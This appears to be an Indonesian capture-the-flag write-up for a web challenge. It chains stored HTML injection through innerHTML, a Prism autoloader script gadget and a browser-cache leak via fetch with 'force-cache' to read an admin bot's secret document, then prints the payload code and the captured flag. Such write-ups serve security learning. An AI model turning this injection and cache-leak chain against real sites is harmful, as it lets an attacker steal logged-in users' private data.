# dont-worry

## Ringkasan

Bug yang kepakai ada dua:

1. Stored HTML injection di reader karena body dokumen dirender pakai `innerHTML`.
2. Cache poisoning/leak di browser bot karena request ke `/api/documents/welcome?key=x&view=editor` masih bisa mengambil response lama kalau dipanggil dengan `fetch(..., { cache: "force-cache" })`.

## Target dan File

- Target: `https://dont-worry-27a519599c7b.chall.nnsc.tf`
- File lokal:
  - `bot.ts`
  - `solve.py`
  - log admin bot `admin-bot-*.jsonl`

## Analisis Awal

`bot.ts` nunjukin alur bot:

1. Bot generate `key = crypto.randomUUID()`.
2. Bot `PUT /api/documents/welcome?key=<uuid>` dengan body flag.
3. Bot buka `/e/welcome#<uuid>` sampai state `loaded`.
4. Bot tidur 15 detik.
5. Bot buka URL path yang kita submit.

Artinya flag pasti masuk ke dokumen `welcome`, dan target eksploitnya adalah bikin browser bot ngebocorin isi dokumen itu.

## Source Code Review

Poin penting dari file bot:

```ts
const status = await editor.evaluate(async ([k, flag]: string[]) => {
  const r = await fetch(`/api/documents/welcome?key=${k}`, {
    method: "PUT",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ title: "Welcome", body: flag }),
  });
  return r.status;
}, [key, ctx.job.flag]);
```

Lalu bot membuka editor:

```ts
await editor.goto(`${origin}/e/welcome#${key}`, {
  waitUntil: "domcontentloaded",
});
```

Di sisi frontend, `reader.js` merender isi dokumen langsung ke DOM:

```js
doc.innerHTML = data.body;
```

Ini bikin stored HTML injection yang bisa dipakai untuk menjalankan gadget Prism autoloader dan load JS dari `/raw/<doc>?key=<key>`.

## Vulnerability

Bug utamanya bukan bypass key server-side biasa. Request normal ke:

`/api/documents/welcome?key=x&view=editor`

akan balas `403`.

Tapi setelah bot lebih dulu membuka editor dokumen yang sama dengan key valid, browser masih menyimpan response editor itu. Response lama ini masih bisa dipakai lagi kalau request berikutnya memakai cache mode eksplisit:

```js
fetch("/api/documents/welcome?key=x&view=editor", {
  cache: "force-cache",
})
```

Payload biasa dengan `fetch()` default gagal. `iframe` biasa juga gagal pada jeda bot 15 detik. Yang stabil justru `fetch(..., { cache: "force-cache" })`.

## Eksploitasi

Langkah eksploit:

1. Buat dokumen JS dengan `language=javascript` supaya `/raw/<id>?key=<key>` punya MIME `text/javascript`.
2. Buat dokumen HTML yang isinya `<code data-dependencies=...>` untuk memaksa Prism autoloader me-load JS tadi sebagai script same-origin.
3. Submit path `/d/<payload>#<key>` ke admin bot.
4. Saat payload jalan di browser bot, JS memanggil:

```js
const r = await fetch("/api/documents/welcome?key=x&view=editor", {
  cache: "force-cache",
});
console.log("FLAGJSON", await r.text());
```

5. Isi dokumen `welcome` muncul di log bot.

## Solve Script

`solve.py` membuat dua dokumen:

- dokumen JS untuk payload `force-cache`
- dokumen HTML untuk memicu Prism autoloader

Output script adalah path yang harus dikirim ke admin bot.

## Cara Menjalankan

Generate payload:

```bash
python3 solve.py
```

Ambil path `/d/...#...` dari output, lalu submit ke admin bot.

Kalau log bot sudah terdownload, flag bisa diambil dari baris:

```text
console.log: FLAGJSON {...}
```

## Flag

Flag didapat langsung dari log bot:

```text
console.log: FLAGJSON {"id":"welcome","title":"Welcome","body":"NNS{A_Wi53_guy_FR0M_s0meWher3_F4R_N0R7H_onc3_t01D_Me:_dont_W0Rry_ab0Ut_17}","language":"none","updated":1788557511}
```

## Catatan Stabilitas

- `fetch()` tanpa `cache: "force-cache"` gagal.
- `iframe` ke endpoint JSON juga gagal pada jeda 15 detik.
- Primitive cache leak yang stabil di alur bot adalah `fetch(..., { cache: "force-cache" })`.
